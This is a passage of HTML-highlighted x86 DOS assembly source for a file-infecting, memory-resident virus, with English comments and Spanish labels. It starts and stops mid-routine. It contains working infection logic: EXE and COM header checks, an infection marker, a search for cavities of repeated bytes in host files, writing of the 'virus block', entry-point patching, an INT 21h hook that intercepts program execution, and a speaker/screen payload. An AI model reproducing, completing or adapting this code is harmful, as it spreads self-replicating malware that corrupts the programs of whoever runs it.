            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">desplazador</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                  </span><span class="sc1">; Move to the right the</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">56</span><span class="sc0">                  </span><span class="sc1">; lower side</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,-</span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">desplazador</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">                     </span><span class="sc1">; Repeat for every square</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">vuelta16</span><span class="sc0">

            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">; Repeat for every character</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">caracter13</span><span class="sc0">
                                           </span><span class="sc1">; Disable the internal speaker</span><span class="sc0">
            </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0fch</span><span class="sc0">
            </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">remolino</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">                           </span><span class="sc1">; Payload end</span><span class="sc0">

</span><span class="sc5">buscador</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">                  </span><span class="sc1">; Read the first bytes</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">; of the file</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">nohalla19</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">     </span><span class="sc1">; Jump if it's an EXE</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ejecuta18</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0003h</span><span class="sc4">],</span><span class="sc2">88h</span><span class="sc0">  </span><span class="sc1">; Jump if the file was</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">nohalla19</span><span class="sc0">                </span><span class="sc1">; previously infected</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; Store the two first words</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; of the file</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">salto</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">principio</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">principio</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                     </span><span class="sc1">; Find out the first word</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">; after the start</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">inicia21</span><span class="sc0">

</span><span class="sc5">ejecuta18</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0013h</span><span class="sc4">],</span><span class="sc2">88h</span><span class="sc0">  </span><span class="sc1">; Jump if it ain't infected</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">calcula20</span><span class="sc0">

</span><span class="sc5">nohalla19</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stc</span><span class="sc0">                              </span><span class="sc1">; Get out without any room</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">calcula20</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0004h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Calcul8 the size in bytes</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
            </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0002h</span><span class="sc4">]</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0008h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Load the header size and</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0014h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; the entry point</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0016h</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">salto</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; Store the data</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">tamano</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">tamano</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">distancia</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">retorno</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">retorno</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                    </span><span class="sc1">; Find out the first word</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">                    </span><span class="sc1">; of the file</span><span class="sc0">
            </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">inicia21</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">; Move the pointer to that</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">; word</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                    </span><span class="sc1">; Our room position (start)</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">lee22</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">16</span><span class="sc0">               </span><span class="sc1">; Read 16k</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">nohalla27</span><span class="sc0">

            </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">; Go thru every word we read</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">busca23</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                       </span><span class="sc1">; Load one word and inc</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">; the global pointer</span><span class="sc0">
            </span><span class="sc6">lodsw</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                       </span><span class="sc1">; If it's equal to the</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">; previous one, jump</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">dato</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">incremen24</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">dato</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Update the found datum</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                    </span><span class="sc1">; and set the room to zero</span><span class="sc0">

</span><span class="sc5">incremen24</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                       </span><span class="sc1">; Inc the room in one word</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">palabras</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Jump if necessary</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">halla26</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">tamano</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; If we go over the size,</span><span class="sc0">
            </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">repite25</span><span class="sc0">                 </span><span class="sc1">; we better skip the file</span><span class="sc0">
            </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">nohalla27</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">tamano</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">nohalla27</span><span class="sc0">

</span><span class="sc5">repite25</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">busca23</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">lee22</span><span class="sc0">

</span><span class="sc5">halla26</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">palabras</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Find out the first offset</span><span class="sc0">
            </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">; of our room</span><span class="sc0">
            </span><span class="sc6">clc</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">nohalla27</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stc</span><span class="sc0">                              </span><span class="sc1">; Go back without any room</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">buscador</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">grabador</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                    </span><span class="sc1">; Copy the pointer</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">salto</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; Jump in case it's an EXE</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ejecuta28</span><span class="sc0">                </span><span class="sc1">; file</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                     </span><span class="sc1">; Find out the distance from</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">distancia</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; the start to the code</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">retorno</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc2">0100h</span><span class="sc0">         </span><span class="sc1">; Save the entry point</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">retorno</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">mueve29</span><span class="sc0">

</span><span class="sc5">ejecuta28</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">                    </span><span class="sc1">; Save the new entry offset</span><span class="sc0">
            </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">principio</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">distancia</span><span class="sc0">             </span><span class="sc1">; Restore the header length</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">principio</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; in the segment</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc5">retorno</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">mueve29</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                    </span><span class="sc1">; Move the pointer to the</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                    </span><span class="sc1">; just found room</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">octetos</span><span class="sc0">               </span><span class="sc1">; Write the virus block</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">vuelve34</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">salto</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; Jump if it's an EXE file</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ejecuta30</span><span class="sc0">
                                             </span><span class="sc1">; Move the pointer to the</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">; start of the file</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">mueve31</span><span class="sc0">

</span><span class="sc5">ejecuta30</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0013h</span><span class="sc0">

</span><span class="sc5">mueve31</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">; Move the pointer to the</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                 </span><span class="sc1">; file header</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">salto</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; Jump if it's an EXE file</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ejecuta32</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                     </span><span class="sc1">; Write a jmp to the viral</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">salto</span><span class="sc0">                 </span><span class="sc1">; code so we're executed</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">escribe33</span><span class="sc0">

</span><span class="sc5">ejecuta32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                     </span><span class="sc1">; Write the new entry point</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">marca</span><span class="sc0">
</span><span class="sc5">escribe33</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">vuelve34</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">grabador</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">rutina24</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                   </span><span class="sc1">; Return the error code</span><span class="sc0">
            </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">rutina21</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8888h</span><span class="sc0">                 </span><span class="sc1">; Yep, we're memory resident</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">termina35</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ca05h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
            </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">termina35</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">                 </span><span class="sc1">; File execution?</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ejecuta36</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fin41</span><span class="sc0">

</span><span class="sc5">ejecuta36</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; Store registers</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">remolino</span><span class="sc0">                 </span><span class="sc1">; Can we execute the payload?</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">                 </span><span class="sc1">; Read and store the int 24h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">; original vector</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">des24</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">seg24</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">rutina24</span><span class="sc0">              </span><span class="sc1">; Point to our routine</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">hueco</span><span class="sc0">                 </span><span class="sc1">; New DTA</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                    </span><span class="sc1">; Look for info about the</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; file</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">27h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">vuelve40</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">                  </span><span class="sc1">; Ask for a 16k mem block</span><span class="sc0">
